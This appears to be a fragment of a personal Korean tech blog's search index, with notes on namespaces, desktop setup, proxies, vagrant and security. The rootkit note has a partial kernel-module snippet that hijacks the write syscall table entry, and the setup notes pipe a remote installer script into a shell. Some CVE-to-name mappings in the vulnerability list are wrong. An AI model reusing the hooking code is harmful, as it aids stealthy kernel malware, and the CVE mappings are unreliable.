http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1839  하나의 socket은 반드시 하나의 network namspace에 속한다. struct sock : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L301 http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L306 struct sock_common : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L158 http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L194 related function :\n sock_net() : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L2162 sock_net_set() : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L2168  system에 존재하는 모든 network namspaces를 담는 list가 추가되었다. http://lxr.free-electrons.com/source/include/net/net_namespace.h#L160 struct list_head net_namespace_list : http://lxr.free-electrons.com/source/net/core/net_namespace.c?v=4.0#L33 http://lxr.free-electrons.com/source/net/core/net_namespace.c?v=4.0#L34\n해당 list를 traverse 하는 macro도 추가되었다. for_each_net() : http://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0#L276 initial network namesapce인 init_net은 loopback device와 모든 physical device, networking table 등을 갖고 있다. http://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0#L140 struct net init_net : http://lxr.free-electrons.com/source/net/core/net_namespace.c?v=4.0#L36 init_net 또한 struct net의 instance이다. 새로 생성되는 각각의 network namespace는 오직 loopback device 만을 가지고 있다. socket은 가지고 있지 않다.\nCGroup Reference http://www.toptal.com/linux/separation-anxiety-isolating-your-system-with-linux-namespaces https://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/ http://crosbymichael.com/creating-containers-part-1.html http://www.lizhaozhong.info/archives/tag/namespace http://www.cnblogs.com/blueswu/p/3566307.html\n"
},
{
	"uri": "https://keyolk.github.io/security/openscap/",
	"title": "openscap",
	"tags": [],
	"description": "",
	"content": " SCAP: Security Content Automation Protocol XCCDF: Extensible Configuration Checklist Description Format OVAL: Open Vulnerability and Assessment Language  "
},
{
	"uri": "https://keyolk.github.io/network/osi7/",
	"title": "osi7",
	"tags": [],
	"description": "",
	"content": " OSI 7 Layers  Application Presentation Session Transport Network Data Link Physical  "
},
{
	"uri": "https://keyolk.github.io/workspace/personal/",
	"title": "personal",
	"tags": ["terminal", "gnome"],
	"description": "",
	"content": " Intro 개인 Desktop Environment 구축하기 위해 필요한 Step 정리. 현재 사용 중인 System 기준\n H/W : Chrombook Pixel2 LS OS : ApricityOS Desktop : Gnome3 Terminal : zsh + tmux + nvim + powerline + fzf  Terminal 관련 상세 설정은 여기에서 확인할 수 있다.\nChromebook  enable developer mode enable SeaBIOS  ApricityOS Install https://apricityos.com/download\nKernel https://github.com/raphael/linux-samus\nPackage #!/bin/bash git submodule update --init --recursive sudo pacman -Syy zsh tmux neovim git xclip meld python-pip sudo pacman -Syy python-neovim python2-neovim sudo pacman -Syy fzf the_silver_searcher sudo pacman -Syy docker vagrant # install python virtualenv sudo pacman -Syy pythob-virtualenv python2-virtualenv # install gvm to manage golang version and workspace zsh \u0026lt; \u0026lt;(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer) # install docker-machine sudo sh -c \u0026quot;curl -L https://github.com/docker/machine/releases/download/v0.7.0/docker-machine-`uname -s`-`uname -m` \u0026gt; /usr/local/bin/docker-machine \u0026amp;\u0026amp; \\ chmod +x /usr/local/bin/docker-machine\u0026quot; # install docker-compose sudo sh -c \u0026quot;curl -L https://github.com/docker/compose/releases/download/1.7.1/docker-compose-`uname -s`-`uname -m` \u0026gt; /usr/local/bin/docker-compose; chmod +x /usr/local/bin/docker-compose\u0026quot; # install nautilus-compare to intergrate meld with nautilus git clone https://aur.archlinux.org/nautilus-compare.git ~/workspace/build/aur/nautilus-compare cd ~/workspace/build/aur/nautilus-compare makepkg -si --noconfirm  Gnome Gnome 환경 설정 관련 정리.\nWorkspace Dual Monitor를 쓸때 Secondary Monitor가 Workspace와 동기화되게 하려면 아래와 gnome setting이 수정되어야 한다.\n$ gsettings set org.gnome.shell.overrides workspaces-only-on-primary false  Alt tab이 현재 workspace 내에 존재하는 application 사이에서만 switching되게 하려면,\n$ gsettings set org.gnome.shell.app-switcher current-workspace-only true  InputMethod 한글 입력기론 ibus-hangul을 쓴다. 입력기 관련 설정은 아래에서 찾을 수 있다.\n$ cat /etc/environment  # # This file is parsed by pam_env module # # Syntax: simple \u0026quot;KEY=VAL\u0026quot; pairs on separate lines # BROWSER=/usr/bin/google-chrome-stable EDITOR=nvim GTK_IM_MODULE=ibus XMODIFIERS=@im=ibus QT_IM_MODULE=ibus  Universal Access에서 Screen Keyboard를 Disable해도 계속 나타나는 버그가 있다.\n아래 dbus service에서 관련 항목에 Exec들을 comment해버리면 일단 해결된다. $ vi /usr/share/dbus-1/services/org.gnome.Caribou.Antler.service $ vi /usr/share/dbus-1/services/org.gnome.Caribou.Daemon.service\nWindow Manager Gnome 3.22가 되면서 wayland가 deafult로 설정된다. + 아직 wayland랑 안붙는 utility가 많으므로 아래와 같이 다시 xorg를 쓰도록 한다.\n$ vi /etc/gdm/custom.conf\ndaemon 설정에 아래 line을 넣자.\nWaylandEnable=false\nDesktop FreeDesktopGroup 과 관련된 표준이 존재한다. 기본 Directory가 거슬릴때가 있는데 아래와 같이 수정할 수 있다.\n$ xdg-user-dirs-update --set DOWNLOAD $HOME/desktop/download $ xdg-user-dirs-update --set PUBLICSHARE $HOME/desktop/public $ xdg-user-dirs-update --set VIDEOS $HOME/desktop/videos $ xdg-user-dirs-update --set TEMPLATES $HOME/desktop/templates $ xdg-user-dirs-update --set PICTURES $HOME/desktop/pictures $ xdg-user-dirs-update --set DOCUMENTS $HOME/desktop/documents $ xdg-user-dirs-update --set MUSIC $HOME/desktop/music  ZSH ZSH 관련 설정 정리.\nPlugin Manager antigeen을 plugin managemnt tool로 사용한다. 아래 bundler들을 사용한다.\n# set dotfiles path export DOTFILES=$HOME/.dotfiles # Use antigen as plugin manager source $DOTFILES/zsh/antigen.zsh antigen use oh-my-zsh antigen bundle zsh-users/zsh-syntax-highlighting antigen bundle zsh-users/zsh-history-substring-search antigen bundle command-not-found antigen bundle colorize antigen bundle colored-man-pages antigen bundle vagrant antigen bundle docker antigen bundle python antigen bundle git antigen bundle aws antigen bundle golang antigen bundle python antigen bundle pip antigen apply # Source all *.zsh under .dotfiles for config_file ($DOTFILES/**/*.zsh) source $config_file # Put here private configuration if [[ -a ~/.localrc ]] then source ~/.localrc fi # Prevet nested tmux session if [[ -z \u0026quot;$TMUX\u0026quot; ]]; then exec tmux fi # Set GVM for Golang [[ -s \u0026quot;/home/keyolk/.gvm/scripts/gvm\u0026quot; ]] \u0026amp;\u0026amp; source \u0026quot;/home/keyolk/.gvm/scripts/gvm\u0026quot; # Set default golang gvm use go1.7.3 \u0026amp;\u0026gt; /dev/null # Set default golang project #gvm pkgset use container \u0026amp;\u0026gt; /dev/null # Use fzf for fuzzy search source /usr/share/fzf/completion.zsh source /usr/share/fzf/key-bindings.zsh export PATH=$PATH:/home/keyolk/.gem/ruby/2.3.0/bin export PATH=$PATH:/home/keyolk/tool source \u0026lt;(kubectl completion zsh) source ~/workspace/cnct/k2.sh  # history file HISTFILE=~/.histfile HISTSIZE=10000 SAVEHIST=10000 # for better directory navigation setopt AUTO_PUSHD setopt PUSHD_MINUS setopt CDABLE_VARS zstyle ':completion:*:directory-stack' list-colors '=(#b) #([0-9]#)*( *)==95=38;5;12' # Use vim mode bindkey -v export KEYTIMEOUT=1 # Use powerline source /usr/share/zsh/site-contrib/powerline.zsh ## binding for home/end key # for system bindkey '\\e[1~' beginning-of-line bindkey '\\e[4~' end-of-line bindkey '\\e[7~' beginning-of-line bindkey '\\e[8~' end-of-line bindkey '\\eOH' beginning-of-line bindkey '\\eOF' end-of-line bindkey '\\e[H' beginning-of-line bindkey '\\e[F' end-of-line # for vi-mode bindkey -M vicmd '\\e[1~' beginning-of-line bindkey -M vicmd '\\e[4~' end-of-line ## binding for delete key # for system bindkey '\\e[3~' delete-char # for vi-mode bindkey -M vicmd '\\e[3~' delete-char ## binding for history-substirng-search # for system zmodload zsh/terminfo bindkey \u0026quot;$terminfo[kcuu1]\u0026quot; history-substring-search-up bindkey \u0026quot;$terminfo[kcud1]\u0026quot; history-substring-search-down # for vi-mode bindkey -M vicmd 'k' history-substring-search-up bindkey -M vicmd 'j' history-substring-search-down  alias ls='ls --color -h --group-directories-first'  TMUX # To prevent ESC holding on vi set -s escape-time 0 # Change prefix key set -g prefix C-a unbind C-b bind C-a send-prefix # Set mouse set -g mouse on # act like vim setw -g mode-keys vi # Set the terminal type so colors get rendered correctly set -g default-terminal \u0026quot;screen-256color\u0026quot; set -g default-shell \u0026quot;/usr/bin/zsh\u0026quot; set -g default-command \u0026quot;zsh\u0026quot; set -g renumber-windows on # Powerline source /usr/share/tmux/powerline.conf #### Key bindings # ctrl-r: Reload tmux config bind r source-file ~/.tmux.conf \\; display 'Config reloaded' # sync pane bind y set-window-option synchronize-panes # window naviation bind-key space next-window bind-key bspace previous-window # layout bind-key enter next-layout # Ctrl-[hjkl]: bind h select-pane -L bind j select-pane -D bind k select-pane -U bind l select-pane -R bind -n C-h run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys C-h) || tmux select-pane -L\u0026quot; bind -n C-j run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys C-j) || tmux select-pane -D\u0026quot; bind -n C-k run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys C-k) || tmux select-pane -U\u0026quot; bind -n C-l run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys C-l) || tmux select-pane -R\u0026quot; # alt-[hjkl] bind M-h resize-pane -L 5 bind M-j resize-pane -D 5 bind M-k resize-pane -U 5 bind M-l resize-pane -R 5 bind -n M-h run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys M-h) || tmux resize-pane -L 5\u0026quot; bind -n M-j run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys M-j) || tmux resize-pane -D 5\u0026quot; bind -n M-k run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys M-k) || tmux resize-pane -U 5\u0026quot; bind -n M-l run \u0026quot;(tmux display-message -p '#{pane_current_command}' | grep -iq vim \u0026amp;\u0026amp; tmux send-keys M-l) || tmux resize-pane -R 5\u0026quot; # Window Split bind v split-window -h -c \u0026quot;#{pane_current_path}\u0026quot; bind s split-window -v -c \u0026quot;#{pane_current_path}\u0026quot; bind q confirm killp # Make Home and End keys work in copy mode unbind-key -t vi-copy Home bind-key -t vi-copy Home start-of-line unbind-key -t vi-copy End bind-key -t vi-copy End end-of-line # Plugins set -g @plugin 'tmux-plugins/tpm' set -g @plugin 'tmux-plugins/tmux-sensible' set -g @plugin 'christoomey/vim-tmux-navigator' run '~/.tmux/plugins/tpm/tpm'  NVIM NVim 설정 정리.\nKey Binding nvim 에서 Ctrl+[hH] 동작은 terminal 예약키와 겹쳐서 key binding이 안될 수 있다.\n아래와 같이 terminal 정보 수정이 필요하다.\n$ infocmp $TERM | sed 's/kbs=^[hH]/kbs=\\\\177/' \u0026gt; ~/$TERM.ti $ tic ~/$TERM.ti $ rm ~/$TERM.ti  Troubleshooting Powerline  gnome 3.22 update 이후 powerlien character가 밀리는 현상이 있다.  아래와 같이 문제가되는 문자를 바꿔준다.\npowerline.json\n\u0026quot;time\u0026quot;: { - \u0026quot;before\u0026quot;: \u0026quot;◴ \u0026quot; + \u0026quot;before\u0026quot;: \u0026quot; \u0026quot; },  "
},
{
	"uri": "https://keyolk.github.io/workspace/prefix/",
	"title": "prefix",
	"tags": ["terminal"],
	"description": "",
	"content": " Intro Root 권한이 없는 System에서 개인 workspace를 만들기위해 필요한 package를 설치하기위해 Gentoo Prefix를 사용.\n관련 Step 정리.\n$ wget https://gitweb.gentoo.org/repo/proj/prefix.git/plain/scripts/bootstrap-prefix.sh $ chmod +x bootstrap-prefix.sh $ ./bootstrap-prefix.sh  RAP libc version이 낮은 system에선 prefix가 정상적으로 bootstrap 되지 않는다. RAP script를 사용하면 최신 libc부터 시작하여 prefix를 bootstrap 해준다.\n$ wget http://dev.gentoo.org/~heroxbd/bootstrap-rap.sh $ chmod +x bootstrap-rap.sh $ ./bootstrap-rap.sh  bash version이 낮은 경우 bash 부터 bootstrap 해야한다. https://wiki.gentoo.org/wiki/Project:Prefix/Bootstrap\n$ wget https://gitweb.gentoo.org/repo/proj/prefix.git/plain/scripts/bootstrap-bash.sh $ chmod +x bootstrap-bash.sh $ mkdir -p /tmp/bash $ ./bootstrap-bash /tmp/bash  Initialize bootstrap이 완료되면 startprefix script 가 생성된다.\n$ ./startprefix  이때 부터 emerge 등 gentoo의 package system CLI를 사용할 수 있다.\n필요한 package를 아래와 같이 설치한다.\n$ emerge --sync $ etc-update $ emerge --update --newuse sys-apps/portage  fish, tmux, neovim 설치\n$ emerge app-shells/fish $ emerge app-misc/tmux $ env USE=\u0026quot;-clipboard\u0026quot; emerge app-editors/neovim $ emerge dev-python/pip $ emerge ripgrep  python은 아래와 같이 사용할 수 있다.\n$ eselect python list Available Python interpreters, in order of preference: [1] python2.7 [2] python3.4 $ esectct python set 1 $ pip installn neovim $ esectct python set 2 $ pip installn neovim  Reference  https://wiki.gentoo.org/wiki/Project:Prefix https://wiki.gentoo.org/wiki/Prefix/libc  "
},
{
	"uri": "https://keyolk.github.io/system/linux/proxy/",
	"title": "proxy",
	"tags": [],
	"description": "",
	"content": " Proxy Auto Config 대부분의 Browser에서 지원한다. javascript syntax를 사용한다.\nCLI에서 지원을 잘 안하는것 같다.\n libproxy가 이를 지원하기위해 개발되고 있다. https://libproxy.github.io/libproxy\n pacparser를 사용하면 pac으로 부터 URL에 해당되는 Proxy 정보를 가져올 수 있다. https://github.com/pacparser/pacparser\n  SSH Proxy  OpenSSH를 활용하여 간단한 SOCKS proxy를 만들 수 있다. https://keyolk.github.io/2016/06/30/Open-S-S-H.html\n SOCKS proxy를 사용하지 못하는 application에서는 tsocks나 proxychains, sshuttle을 사용한다.\n  Utilities  tsocks를 사용하면 SOCKS proxy를 지원하지 않는 application에서도 이를 사용할 수 있게 할 수 있다. proxychains를 사용하면 application별로 proxy를 할당해 줄 수 있다. sshuttle은 동적인 iptable을 구성하여 ssh proxy를 사용할 수 있도록 도와준다. redsocks를 사용하면 좀 더 편하게 SOCKS proxy를 구축할 수 있다. squid 다소 사용이 복잡하지만 여러 상황에서 활용할 수 있다.  "
},
{
	"uri": "https://keyolk.github.io/language/regular_expression/",
	"title": "regular expression",
	"tags": [],
	"description": "",
	"content": " Type  Posix Rerular Expression  BRE: Basic Regular Expression ERE: Extened Regular Expression  PCRE: Perl Compatible Regular Expression  Posix Regular Expression  IEE std 1003.1            문자지정 . 임의의 문자 한개   반복 지정 ? 선행 문자 패턴이 0개 혹은 1개    + 선행 문자 패턴이 1개 이상 반복    * 선행 문자 패턴이 0개 이상 반복    {m, n} 반복수 지정   위치지정 ^ 라인의 앞부분    $ 라인의 끝부분   그룹 지정 [\u0026hellip;] 그룹 중 한 문자    [^\u0026hellip;] 그룹 내 문자들을 제외한 나머지   기타  escape    | OR    () pattern group    "
},
{
	"uri": "https://keyolk.github.io/security/rootkit/",
	"title": "rootkit",
	"tags": [],
	"description": "",
	"content": " LKM  kernel내 syscall table에 등록된 syscall의 주소를 변조. kernel의 syscall 내부에 inline assembly로 구현된어있는 function들에 대한 offset을 변조.  asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) { printk(KERN_EMERG \u0026quot;[+] write() hooked.\u0026quot;); return original_write(x, y, size); } static int __init onload(void) { char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL); printk(KERN_EMERG \u0026quot;Version: %s\\n\u0026quot;, acquire_kernel_version(kernel_version)); find_sys_call_table(acquire_kernel_version(kernel_version)); printk(KERN_EMERG \u0026quot;Syscall table address: %p\\n\u0026quot;, syscall_table); printk(KERN_EMERG \u0026quot;sizeof(unsigned long *): %zx\\n\u0026quot;, sizeof(unsigned long*)); printk(KERN_EMERG \u0026quot;sizeof(sys_call_table) : %zx\\n\u0026quot;, sizeof(syscall_table)); if (syscall_table != NULL) { write_cr0 (read_cr0 () \u0026amp; (~ 0x10000)); original_write = (void *)syscall_table[__NR_write]; syscall_table[__NR_write] = \u0026amp;new_write; write_cr0 (read_cr0 () | 0x10000); printk(KERN_EMERG \u0026quot;[+] onload: sys_call_table hooked\\n\u0026quot;); } else { printk(KERN_EMERG \u0026quot;[-] onload: syscall_table is NULL\\n\u0026quot;); } kfree(kernel_version); return 0; }  "
},
{
	"uri": "https://keyolk.github.io/architecture/serverless/",
	"title": "serverless",
	"tags": [],
	"description": "",
	"content": " Intro FAAS, Function as a Service\nService Provider  lambda by AWS iron.io openwhisk by IBM Bluemix webtask.io nstack formerly stackhut  Framework  Serverless by AWS Apex CloudiaJS  Openrsource Kubernetes  funktion by Fabric fission by Platform9 kubeless  Reference  https://martinfowler.com/articles/serverless.html  "
},
{
	"uri": "https://keyolk.github.io/language/shellscript/",
	"title": "shellscript",
	"tags": [],
	"description": "",
	"content": " Parameter    variable Set and Not Null Set But Null Unset     ${parameter:-word} substitute parameter substitute word substitute word   ${parameter-word} substitute parameter substitute null substitute word   ${parameter:=word} substitute parameter assign word assign word   ${parameter=word} substitute parameter substitute null assign word   ${parameter:?word} substitute parameter error, exit error, exit   ${parameter?word} substitute parameter substitute null error, exit   ${parameter:+word} substitute word substitute null substitute null    Parameter Expansion  Case modification  ${var^} ${var^^} ${var,} ${var,,} ${var~} ${var~~}   Reference  http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_02 http://wiki.bash-hackers.org/syntax/pe  "
},
{
	"uri": "https://keyolk.github.io/system/container/standard/",
	"title": "standard",
	"tags": [],
	"description": "",
	"content": " Engine OCI Open Container Initiative\nhttps://www.opencontainers.org/\nAPPC Application Container Basics\nhttps://github.com/appc/spec\nCNCF Clound Native Computing Foundtaion\nhttps://www.cncf.io/\nCRI-O Container Runtime Interface\naka OCID, Open Container Initiative Daemon\nhttps://github.com/kubernetes-incubator/cri-o\nhttp://thenewstack.io/cri-o-make-kubernetes-center-container-ecosystem/\nNetwork CNI libnetwork "
},
{
	"uri": "https://keyolk.github.io/system/thread/",
	"title": "thread",
	"tags": [],
	"description": "",
	"content": " Process \u0026amp; Thread "
},
{
	"uri": "https://keyolk.github.io/system/linux/vagrant/",
	"title": "vagrant",
	"tags": [],
	"description": "",
	"content": " Remote Vagrant Setup Setup libvirtd /usr/sbin/useradd -c 'HAL daemon' -u 68 -s /sbin/nologin -r -d '/' haldaemon /usr/sbin/useradd -c 'dbus' -u 69 -s /sbin/nologin -r -d '/' dbus mount -o ro,remount /sys; mount -o rw,remount /sys mount -t mqueue none /dev/mqueue service messagebus start service libvirtd start  $ virsh -c qemu:///system list  Install Vagarnt on Client wget https://releases.hashicorp.com/vagrant/1.9.1/vagrant_1.9.1_x86_64.rpm rpm -ivh vagrant*.rpm vagrant plugin install vagrant-libvirt --plugin-version 0.0.35 vagrant init fedora/24-cloud-base vagrant up --provider=libvirt  Sample Vagrantfile INSTANCE_PREFIX=\u0026quot;centos\u0026quot; $num_instance = 3 $box = \u0026quot;centos/7\u0026quot; $vm_cpus = 2 $vm_memory = 1024 Vagrant.configure(\u0026quot;2\u0026quot;) do |config| def customize(config) config.vm.box = $box config.ssh.insert_key = false config.ssh.forward_agent = true config.ssh.forward_x11 = true config.vm.provider :libvirt do |libvirt| libvirt.driver = \u0026quot;kvm\u0026quot; libvirt.host = \u0026quot;sample\u0026quot; libvirt.username = \u0026quot;username\u0026quot; libvirt.storage_pool_name = \u0026quot;default\u0026quot; libvirt.connect_via_ssh = \u0026quot;true\u0026quot; end end $num_intance.times do |i| config.vm.define \u0026quot;#{INSTANCE_PREFIX}-#{i}.vagrant\u0026quot; do |target| customize target instance_index = i target.vm.hostname = \u0026quot;#{INSTANCE_PREFIX}-#{instance_index}.vagrant\u0026quot; end end end  "
},
{
	"uri": "https://keyolk.github.io/network/virtual_network/",
	"title": "virtual network",
	"tags": [],
	"description": "",
	"content": " SDN Software Defined Network\nNFV Network Function Virtualization\nOverlay and Underlay  VLAN GRE : Generic Route Encapsulation VXLAN : Virtual Extensible LAN Flat\n BGP : Border Gateway Protocol\n  "
},
{
	"uri": "https://keyolk.github.io/security/vulnerability/",
	"title": "vulnerability",
	"tags": [],
	"description": "",
	"content": " Taxonomy of Linux Kernel Vulnerability Solutions Input Validation Error  Buffer Overflow Boundary Condition Error Access Validation Error Exceptional Condition Handling Error Environmental Error Configuration Error Design Error Nonstandard  Remedial Classification  Change of Data Types Precondition Validation Ensuring Atomicity Error Handling Zeroing Memory Freeing Resources Input Validation Capability Validation Fail-Safe Protection Domain Enforcement Redesign Other  Exploit Null Dereferencing vm.mmap_min_addr  Stack Overflow Heap Overflow Heap Spray Vulnerabilities  Spectre  CVE-2017-5754 CVE-2017-5753  Meltdown  CVE-2017-5715  BlueBorne  CVE-2017-0785 CVE-2017-0782 CVE-2017-1000251 CVE-2017-1000250 CVE-2017-8628  ROCA vulnerability  CVE-2017-15361  KRACK  CVE-2017-13077 CVE-2017-13078  Silent Bob is Silent  CVE-2017-5689  DoublePulsar  CVE-2017-7497  EternallBlue  CVE-2017-0143  Dirty COW  CVE-2016-5195  Badlock  CVE-2016-0128 CVE-2016-2118  DROWN  CVE-2016-0800  Row hammer  CVE-2015-0565  POODLE  CVE-2014-8730 CVE-2014-3566  Shellshock  CVE-2014-7187 CVE-2014-7186 CVE-2014-7169 CVE-2014-6278 CVE-2014-6271 CVE-2014-6277  Heartbleed  CVE-2014-0160   "
}]